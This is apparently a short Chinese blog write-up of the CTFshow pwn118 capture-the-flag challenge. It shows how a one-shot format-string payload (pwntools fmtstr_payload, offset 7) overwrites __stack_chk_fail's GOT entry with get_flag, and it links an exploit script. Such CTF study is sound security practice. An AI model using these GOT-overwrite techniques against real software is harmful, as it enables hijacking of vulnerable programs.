---
title: CTFshow pwn118 格式化字符串改 GOT
published: 2026-04-17
updated: 2026-04-17
description: 只有一次输入机会时，不再先 leak canary，而是直接把 __stack_chk_fail@got 改到 get_flag。
tags: [CTFshow, Pwn, Stack, Format String, GOT Hijack]
category: ctfshow
draft: false
---

# 题目结论

因为这题只给一次读入机会，所以 pwn115 / pwn116 那种“先 leak 再第二次溢出”的打法走不通。

更直接的做法是用格式化字符串一次性把 `__stack_chk_fail@got` 改成 `get_flag`。这样程序一旦走到栈保护失败路径，实际调用的就不是报错函数，而是目标函数。

## 关键 exp 片段

```python
stackcheck = elf.got['__stack_chk_fail']
get_flag = elf.sym['get_flag']
payload = fmtstr_payload(7, {stackcheck: get_flag})
payload = payload.ljust(0x50, b'a')
p.sendline(payload)
```

这题里最重要的数字是格式化字符串偏移 `7`。

## 下载

- [下载题目附件 `pwn`](../../../attachments/ctfshow/pwn118/pwn)
- [下载利用脚本 `exp.py`](../../../attachments/ctfshow/pwn118/exp.py)
- [下载原始笔记 `Bypass_pwn118.md`](../../../attachments/ctfshow/pwn118/Bypass_pwn118.md)

## 适合记住的点

“只有一次输入机会”时，要优先考虑单发打法：

- GOT 覆写
- 返回地址直跳
- 一次性写完的格式化字符串利用
